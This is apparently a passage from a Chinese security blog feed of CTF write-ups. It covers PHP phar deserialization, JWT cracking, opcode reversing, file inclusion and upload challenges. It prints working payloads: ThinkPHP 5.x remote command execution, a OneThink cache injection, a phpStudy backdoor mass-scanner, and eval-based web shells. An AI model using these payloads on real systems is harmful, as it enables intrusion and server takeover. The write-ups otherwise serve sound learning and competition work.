operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span><span class="token string">"test.gif"</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre><p>在删除的时候拿到flag<br>解释：<br>User-&gt;db是FileList类，Userdestruct时会调用db的close方法，因为FileList没有close方法所以触发call函数，call里面的逻辑就是再去调用$file的同名方法，$file是一个File类，所以就调用了File的close方法，读取了文件，存到FileList类的result中，destruct时候打印到页面。<br>有了pop链然后就是找触发反序列化的点，看上去有三个参数可控点可以触发，分别是download.php中和delete.php中调用的File类的open方法，其中有file_exist函数。另外是delete.php中调用的File的delete方法，里面有unlink函数。<br>但实际上unlink那里的没办法传参，参数是不可控的，只能通过open方法。而download中的open方法前面被open_basedir限制了路径，没办法利用。所以最后的触发点就是delete.php中的filename参数。上传伪装的phar文件test.gif，然后向delete.php用post发送filename=phar://test.gif就会在返回值中打印出flag     </p><p>#参考链接<br><a href="http://adm1n.design/2019/09/10/Ciscn%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Dropbox/" target="_blank" rel="noopener">http://adm1n.design/2019/09/10/Ciscn%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Dropbox/</a><br><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwt</title>
      <link href="/2020/01/01/jwt/"/>
      <url>/2020/01/01/jwt/</url>
      
        <content type="html"><![CDATA[<h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>Json Web Token简称jwt，其实感觉和flask session很像<a href="https://kit4y.github.io/2019/11/19/flask-zhong-session-de-na-xie-shi/">https://kit4y.github.io/2019/11/19/flask-zhong-session-de-na-xie-shi/</a><br>JWT一般的为三部分：<code>header,payload,Signature</code><br>而flask-session的三部分为<code>json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code></p><h3 id="jwt组成"><a href="#jwt组成" class="headerlink" title="jwt组成"></a>jwt组成</h3><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>通常由两部分组成：令牌的类型，即JWT和正在使用的散列算法，如HMAC SHA256或RSA。</p><pre><code>{    &quot;alg&quot;:&quot;RS256&quot;,    &quot;typ&quot;:&quot;JWT&quot;}</code></pre><p>alg为算法的缩写，typ为类型的缩写</p><p>然后，这个JSON被Base64编码，形成JSON Web Token的第一部分。</p><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>令牌的第二部分是包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。</p><p>这里是用户随意定义的数据</p><p>例如上面的举例</p><pre><code>{    &quot;name&quot;:&quot;adminsky&quot;,    &quot;priv&quot;:&quot;other&quot;}</code></pre><p>然后将有效载荷Base64进行编码以形成JSON Web Token的第二部分。</p><p>但是需要注意对于已签名的令牌，此信息尽管受到篡改保护，但任何人都可以阅读。除非加密，否则不要将秘密信息放在JWT的有效内容或标题元素中。</p><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>要创建签名部分，必须采用header，payload，密钥</p><p>然后利用header中指定算法进行签名</p><p>例如HS256(HMAC SHA256),签名的构成为</p><pre><code>HMACSHA256(  base64Encode(header) + &quot;.&quot; +  base64Encode(payload),  secret)</code></pre><p>然后将这部分base64编码形成JSON Web Token第三部分　　</p><p>这里采用的是私钥签名，公钥验证的方法。</p><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a><br><a href="http://jwt.calebb.net/" target="_blank" rel="noopener">http://jwt.calebb.net/</a></p><h3 id="jwt密钥爆破工具"><a href="#jwt密钥爆破工具" class="headerlink" title="jwt密钥爆破工具"></a>jwt密钥爆破工具</h3><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a><br>使用方法</p><pre><code>git clone https://github.com/brendan-rius/c-jwt-crackercd c-jwt-crackermake./c-jwt-cracker</code></pre><p><img src="2.png" alt=""></p><h3 id="python3对jwt操作"><a href="#python3对jwt操作" class="headerlink" title="python3对jwt操作"></a>python3对jwt操作</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> jwtdata <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>  <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">,</span>  <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1516239022</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 加密 py3加密后是字节型数据</span>encoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">'secret'</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><span class="token comment" spellcheck="true"># eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ</span><span class="token comment" spellcheck="true"># 7m6JhjDj0Blnye6rLAat5mX0BCivb9XXuEY15LprW8c</span><span class="token keyword">print</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoded<span class="token punctuation">,</span> <span class="token string">'secret'</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022}</span></code></pre><p><img src="1.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP内核</title>
      <link href="/2019/12/04/php-nei-he/"/>
      <url>/2019/12/04/php-nei-he/</url>
      
        <content type="html"><![CDATA[<h3 id="目前编程语言可以分为两大类"><a href="#目前编程语言可以分为两大类" class="headerlink" title="目前编程语言可以分为两大类:"></a>目前编程语言可以分为两大类:</h3><p>第一类是像C/C++， .NET， Java之类的编译型语言， 它们的共性是: 运行之前必须对源代码进行编译，然后运行编译后的目标文件。</p><p>第二类比如:PHP， Javascript， Ruby， Python这些解释型语言， 他们都无需经过编译即可”运行”，虽然可以理解为直接运行</p><p>但它们并不是真的直接就被能被机器理解， 机器只能理解机器语言，那这些语言是怎么被执行的呢， 一般这些语言都需要一个解释器， 由解释器来执行这些源码， 实际上这些语言还是会经过编译环节， 只不过它们一般会在运行的时候实时进行编译。为了效率，并不是所有语言在每次执行的时候都会重新编译一遍， 比如PHP的各种opcode缓存扩展(如APC， xcache， eAccelerator等)，比如Python会将编译的中间文件保存成pyc/pyo文件， 避免每次运行重新进行编译所带来的性能损失。</p><p>PHP的脚本的执行也需要一个解释器， 比如命令行下的php程序，或者apache的mod_php模块等等<br>假设上面的代码保存在名为hello.php的文件中， 用PHP命令行程序执行这个脚本：</p><pre><code>$ php ./hello.php</code></pre><p>这段代码的输出显然是Hello， Tipi!， 那么在执行脚本的时候PHP/Zend都做了些什么呢？<br><img src="1.png" alt=""><br>即:词法分析 =&gt; 语法分析 =&gt; opcode(中间代码)编译 =&gt;Zend Engineer 执行<br>而<br>opcode是php语言里供zend引擎执行的一种中间代码，类似java中的字节码、或者python中的字节码对象pycodeobject.<br>产生命令行</p><pre><code>php -dvld.active=1 t.php</code></pre><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="“百度杯”CTF比赛-十月场-Vld"><a href="#“百度杯”CTF比赛-十月场-Vld" class="headerlink" title="“百度杯”CTF比赛 十月场 Vld"></a>“百度杯”CTF比赛 十月场 Vld</h4><p>内容为是do you know Vulcan Logic Dumper?<br>查看源码获得index.php.txt-呜呜呜 开始做逆向了<br>翻译本在这<a href="https://www.php.net/manual/en/internals2.opcodes.php" target="_blank" rel="noopener">https://www.php.net/manual/en/internals2.opcodes.php</a></p><pre><code>Finding entry pointsBranch analysis from position: 0Jump found. Position 1 = 23, Position 2 = 38Branch analysis from position: 23Jump found. Position 1 = 26, Position 2 = 35Branch analysis from position: 26Jump found. Position 1 = 29, Position 2 = 32Branch analysis from position: 29Jump found. Position 1 = 34Branch analysis from position: 34Jump found. Position 1 = 37Branch analysis from position: 37Jump found. Position 1 = 40Branch analysis from position: 40Return foundBranch analysis from position: 32Jump found. Position 1 = 37Branch analysis from position: 37Branch analysis from position: 35Jump found. Position 1 = 40Branch analysis from position: 40Branch analysis from position: 38Return foundfilename:       C:\ctf\index.phpfunction name:  (null)number of ops:  44compiled vars:  !0 = $a, !1 = $b, !2 = $cline     # *  op                           fetch          ext  return  operands---------------------------------------------------------------------------------   2     0  &gt;   EXT_STMT         1      ECHO                                                     &#39;do+you+know+Vulcan+Logic+Dumper%3F%3Cbr%3E&#39;   3     2      EXT_STMT         3      BEGIN_SILENCE                                    ~0         4      FETCH_R                      global              $1      &#39;_GET&#39;         5      FETCH_DIM_R                                      $2      $1, &#39;flag1&#39;         6      END_SILENCE                                              ~0         7      ASSIGN                                                   !0, $2   4     8      EXT_STMT         9      BEGIN_SILENCE                                    ~4        10      FETCH_R                      global              $5      &#39;_GET&#39;        11      FETCH_DIM_R                                      $6      $5, &#39;flag2&#39;        12      END_SILENCE                                              ~4        13      ASSIGN                                                   !1, $6   5    14      EXT_STMT        15      BEGIN_SILENCE                                    ~8        16      FETCH_R                      global              $9      &#39;_GET&#39;        17      FETCH_DIM_R                                      $10     $9, &#39;flag3&#39;        18      END_SILENCE                                              ~8        19      ASSIGN                                                   !2, $10   6    20      EXT_STMT        21      IS_EQUAL                                         ~12     !0, &#39;fvhjjihfcv&#39;        22    &gt; JMPZ                                                     ~12, -&gt;38   7    23  &gt;   EXT_STMT        24      IS_EQUAL                                         ~13     !1, &#39;gfuyiyhioyf&#39;        25    &gt; JMPZ                                                     ~13, -&gt;35   8    26  &gt;   EXT_STMT        27      IS_EQUAL                                         ~14     !2, &#39;yugoiiyhi&#39;        28    &gt; JMPZ                                                     ~14, -&gt;32   9    29  &gt;   EXT_STMT        30      ECHO                                                     &#39;the+next+step+is+xxx.zip&#39;  10    31    &gt; JMP                                                      -&gt;34  11    32  &gt;   EXT_STMT        33      ECHO                                                     &#39;false%3Cbr%3E&#39;  13    34  &gt; &gt; JMP                                                      -&gt;37  14    35  &gt;   EXT_STMT        36      ECHO                                                     &#39;false%3Cbr%3E&#39;  16    37  &gt; &gt; JMP                                                      -&gt;40  17    38  &gt;   EXT_STMT        39      ECHO                                                     &#39;false%3Cbr%3E&#39;  19    40  &gt;   NOP  22    41      EXT_STMT        42      ECHO                                                     &#39;%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A&#39;        43    &gt; RETURN                                                   1branch: #  0; line:     2-    6; sop:     0; eop:    22; out1:  23; out2:  38branch: # 23; line:     7-    7; sop:    23; eop:    25; out1:  26; out2:  35branch: # 26; line:     8-    8; sop:    26; eop:    28; out1:  29; out2:  32branch: # 29; line:     9-   10; sop:    29; eop:    31; out1:  34branch: # 32; line:    11-   13; sop:    32; eop:    33; out1:  34branch: # 34; line:    13-   13; sop:    34; eop:    34; out1:  37branch: # 35; line:    14-   16; sop:    35; eop:    36; out1:  37branch: # 37; line:    16-   16; sop:    37; eop:    37; out1:  40branch: # 38; line:    17-   19; sop:    38; eop:    39; out1:  40branch: # 40; line:    19-   22; sop:    40; eop:    43path #1: 0, 23, 26, 29, 34, 37, 40,path #2: 0, 23, 26, 32, 34, 37, 40,path #3: 0, 23, 35, 37, 40,path #4: 0, 38, 40,do you know Vulcan Logic Dumper?&lt;br&gt;false&lt;br&gt;&lt;!-- index.php.txt ?&gt;</code></pre><p>逆向结果</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">'do you know Vulcan Logic Dumper?&lt;br>'</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!=</span><span class="token string">'fvhjjihfcv'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'false&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">!=</span><span class="token string">'gfuyiyhioyf'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'false&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">!=</span><span class="token string">'yugoiiyhi'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'false&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'the next step is xxx.zip'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;!-- index.php.txt ?>'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>poc</p><pre><code>http://d0705cd371b64926bff52061f6c2483e4d1297d84f964ae2.changame.ichunqiu.com/?flag1=fvhjjihfcv&amp;flag2=gfuyiyhioyf&amp;flag3=yugoiiyhi</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>遇到过的cms和框架的漏洞</title>
      <link href="/2019/12/04/yu-dao-guo-de-cms-he-kuang-jia-de-lou-dong/"/>
      <url>/2019/12/04/yu-dao-guo-de-cms-he-kuang-jia-de-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="ThinkPHP-5-0-x、5-1-x、5-2-x-全版本REC-远程命令-代码执行漏洞"><a href="#ThinkPHP-5-0-x、5-1-x、5-2-x-全版本REC-远程命令-代码执行漏洞" class="headerlink" title="ThinkPHP 5.0.x、5.1.x、5.2.x 全版本REC(远程命令/代码执行漏洞)"></a>ThinkPHP 5.0.x、5.1.x、5.2.x 全版本REC(远程命令/代码执行漏洞)</h3><pre><code>index.php?s=captchapost:_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><p>远程执行命令payload(不唯一):</p><pre><code>index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>写文件payload(不唯一):</p><pre><code>index.php?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;i</code></pre><h3 id="kindeditor编辑器的文件目录遍历漏洞"><a href="#kindeditor编辑器的文件目录遍历漏洞" class="headerlink" title="kindeditor编辑器的文件目录遍历漏洞"></a>kindeditor编辑器的文件目录遍历漏洞</h3><pre><code>http://2c0bc5a13a96421a844a8ec8ec3743efc0c7f53181614fcc.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../</code></pre><h3 id="OneThink-CMS的缓存漏洞"><a href="#OneThink-CMS的缓存漏洞" class="headerlink" title="OneThink CMS的缓存漏洞"></a>OneThink CMS的缓存漏洞</h3><pre><code>新建用户%0a$a=$_GET[a];#%0asystem($a);#</code></pre><p>记得urldecode<br>然后访问</p><pre><code>http://19640660af614d60879d5f56b41efc7ae9b0ab83ffb74fd0.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=ls</code></pre><h3 id="phpstudy后门检测"><a href="#phpstudy后门检测" class="headerlink" title="phpstudy后门检测"></a>phpstudy后门检测</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># !/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> gevent<span class="token keyword">from</span> gevent <span class="token keyword">import</span> monkeygevent<span class="token punctuation">.</span>monkey<span class="token punctuation">.</span>patch_all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">import</span> requests <span class="token keyword">as</span> rq<span class="token keyword">def</span> <span class="token function">file_read</span><span class="token punctuation">(</span>file_name<span class="token operator">=</span><span class="token string">"http-200-list.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file_name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    if "http://" or "https://" not in url:        url = "https://" + url    '''</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span><span class="token punctuation">,</span>        <span class="token string">'Sec-Fetch-Mode'</span><span class="token punctuation">:</span> <span class="token string">'navigate'</span><span class="token punctuation">,</span>        <span class="token string">'Sec-Fetch-User'</span><span class="token punctuation">:</span> <span class="token string">'?1'</span><span class="token punctuation">,</span>        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span><span class="token punctuation">,</span>        <span class="token string">'Sec-Fetch-Site'</span><span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>        <span class="token string">'Accept-Charset'</span><span class="token punctuation">:</span> <span class="token string">'ZWNobyBlZVN6eHU5Mm5JREFiOw=='</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 输出 eeSzxu92nIDAb</span>        <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip,deflate'</span><span class="token punctuation">,</span>        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.9'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> rq<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'eeSzxu92nIDAb'</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(res.text.find('eeSzxu92nIDAb'))</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'eeSzxu92nIDAb'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[存在漏洞] "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>                f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"ok.txt"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[存在漏洞] "</span> <span class="token operator">+</span> url<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[不存在漏洞] "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#raise e</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[超时] "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"phpStudy 批量检测 (需要 gevent,requests 库)"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"使用之前，请将URL保存为 url.txt 放置此程序同目录下"</span><span class="token punctuation">)</span>    input<span class="token punctuation">(</span><span class="token string">"任意按键开始执行.."</span><span class="token punctuation">)</span>    tasks <span class="token operator">=</span> <span class="token punctuation">[</span>gevent<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>check<span class="token punctuation">,</span> url<span class="token punctuation">)</span> <span class="token keyword">for</span> url <span class="token keyword">in</span> file_read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在执行...请等候"</span><span class="token punctuation">)</span>    gevent<span class="token punctuation">.</span>joinall<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>    wait <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"执行完毕 任意键退出..."</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php文件包含</title>
      <link href="/2019/12/03/php-wen-jian-bao-han/"/>
      <url>/2019/12/03/php-wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<h4 id="“百度杯”CTF比赛-2017-二月场-include"><a href="#“百度杯”CTF比赛-2017-二月场-include" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-include"></a>“百度杯”CTF比赛 2017 二月场-include</h4><p>可以使用<br><code>php://filter/convert.base64-encode/resource=index.php</code>读取任意文件但是没啥用，不知道flag文件的名字<br>所以使用<br><code>http://ace46edd1c9f412eb50fa9cd198420223e7b80edf0ee4d9c.changame.ichunqiu.com/?path=php://input</code><br>post<br><code>&lt;?php system(&quot;ls&quot;);?&gt;</code>读取目录<br><code>&lt;?php system(&quot;cat dle345aae.php | base64&quot;);?&gt;</code>读取到flag</p><h4 id="百度杯十二月–看看我的Notebook-session文件包含"><a href="#百度杯十二月–看看我的Notebook-session文件包含" class="headerlink" title="百度杯十二月–看看我的Notebook-session文件包含"></a>百度杯十二月–看看我的Notebook-session文件包含</h4><p><img src="1.png" alt=""><br>之后在robots.txt发现php1nFo.php文件<br><code>http://ceb4e4f921b2444eaeb20d272f7a9cef79afe475f5c7447f.game.ichunqiu.com/action.php?module=php&amp;file=php1nFo</code><br>发现<br><img src="2.png" alt=""><br><img src="3.png" alt=""><br>poc<br>注册用户</p><pre><code>&lt;?php @eval($_POST[cmd]);?&gt;</code></pre><p>登录然后查看自己的session</p><pre><code>PHPSESSID:e12gf61f8dqd0vfpg4ssntdpc7</code></pre><p>然后访问</p><pre><code>http://cd674daadfa14fda832ca1e08c3ad0853810ea5951d34a15.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_e12gf61f8dqd0vfpg4ssntdpc7</code></pre><p><img src="4.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php文件上传</title>
      <link href="/2019/12/03/php-wen-jian-shang-chuan/"/>
      <url>/2019/12/03/php-wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h4 id="“百度杯”CTF比赛-2017-九月场-upload"><a href="#“百度杯”CTF比赛-2017-九月场-upload" class="headerlink" title="“百度杯”CTF比赛 2017 九月场-upload"></a>“百度杯”CTF比赛 2017 九月场-upload</h4><p>题目描述</p><pre><code>想怎么传就怎么传，就是这么任性。tips:flag在flag.php中   </code></pre><p>过滤了<code>&lt;?</code> 和<code>php</code><br>使用<br><code>&lt;script language=&#39;PhP&#39;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code><br>读取flag即可，有时候system函数无回显可以加上base64<br><code>cmd=system(&quot;cat ../flag.php | base64&quot;);</code>然后解码即可</p><h4 id="第三届“百越杯”福建省高校网络空间安全大赛-Do-you-know-upload？"><a href="#第三届“百越杯”福建省高校网络空间安全大赛-Do-you-know-upload？" class="headerlink" title="第三届“百越杯”福建省高校网络空间安全大赛-Do you know upload？"></a>第三届“百越杯”福建省高校网络空间安全大赛-Do you know upload？</h4><p>首先文件上传，抓包改后缀即可，然后发现没有flag!!!<br>但是读取config.php的时候</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"ctf"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"ctfctfctf"</span><span class="token punctuation">;</span><span class="token variable">$database</span> <span class="token operator">=</span> <span class="token string">"ctf"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 创建连接</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">" connect to mysql error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>然后通过蚁剑连接数据库，获得flag</p><p><img src="1.png" 